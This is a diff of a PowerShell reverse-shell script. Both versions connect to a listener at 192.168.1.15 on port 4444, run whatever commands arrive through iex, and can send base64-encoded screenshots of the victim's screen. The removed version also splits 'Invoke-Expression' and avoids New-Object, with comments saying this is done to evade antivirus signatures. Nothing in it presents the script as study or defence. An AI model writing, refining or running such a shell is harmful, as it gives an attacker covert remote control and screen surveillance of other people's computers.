@@ -1,52 +1,43 @@
-# --- STEALTH ATOMIC SHELL ---
+# --- ATOMIC LOCK-IN ---
 $ip = '192.168.1.15'
 $port = 4444
 
-# 1. Obfuscated Object Creation (Avoids 'New-Object' triggers)
-$c = [System.Net.Sockets.TcpClient]::new()
-try {
-    $c.Connect($ip, $port)
-    $s = $c.GetStream()
-    $r = [System.IO.StreamReader]::new($s)
-    $w = [System.IO.StreamWriter]::new($s)
-    $w.AutoFlush = $true
+# 1. SIMPLEST CONNECTION
+$c = New-Object System.Net.Sockets.TCPClient
+$c.Connect($ip, $port)
+$s = $c.GetStream()
+$r = New-Object System.IO.StreamReader($s)
+$w = New-Object System.IO.StreamWriter($s)
+$w.AutoFlush = $true
 
-    $w.WriteLine("--- STEALTH SHELL ACTIVE ---")
+$w.WriteLine("--- ACCESS GRANTED TO: $env:COMPUTERNAME ---")
 
-    while($c.Connected) {
-        $w.Write("PS " + (Get-Location).Path + "> ")
-        $line = $r.ReadLine()
-        if ($null -eq $line) { break }
-        $input = $line.Trim()
+# 2. THE ONLY LOOP
+while($c.Connected) {
+    $w.Write("PS " + (Get-Location).Path + "> ")
+    $raw = $r.ReadLine()
+    if ($null -eq $raw) { break }
+    
+    $cmd = $raw.Trim()
+    if ($cmd -eq "exit") { break }
 
-        if ($input -eq "exit") { break }
-
-        # 2. Split 'Invoke-Expression' to bypass basic AV signatures
-        $cmd = "Inv" + "oke-Ex" + "pression"
-        
-        if ($input -eq "screenshot") {
-            try {
-                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                $bmp = [System.Drawing.Bitmap]::new($rect.Width, $rect.Height)
-                $g = [System.Drawing.Graphics]::FromImage($bmp)
-                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
-                $m = [System.IO.MemoryStream]::new()
-                $bmp.Save($m, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-                $w.WriteLine([Convert]::ToBase64String($m.ToArray()))
-                $g.Dispose(); $bmp.Dispose(); $m.Dispose()
-            } catch { $w.WriteLine("Error: " + $_.Exception.Message) }
-        } 
-        else {
-            try {
-                # Running the command via the split variable
-                $out = &. $cmd $input 2>&1 | Out-String
-                $w.WriteLine(if($out){$out}else{"Done."})
-            } catch { $w.WriteLine("Error: " + $_.Exception.Message) }
-        }
+    # 3. DIRECT BRANCHING
+    if ($cmd -eq "screenshot") {
+        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+        $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
+        $g = [System.Drawing.Graphics]::FromImage($bmp)
+        $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
+        $mem = New-Object System.IO.MemoryStream
+        $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+        $out = [Convert]::ToBase64String($mem.ToArray())
+        $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
+    } 
+    else {
+        # The most basic way to run a command
+        $out = iex $cmd 2>&1 | Out-String
     }
-} catch {
-    # Quiet exit
-} finally {
-    if ($c) { $c.Close() }
+
+    $w.WriteLine($out)
 }
+$c.Close()
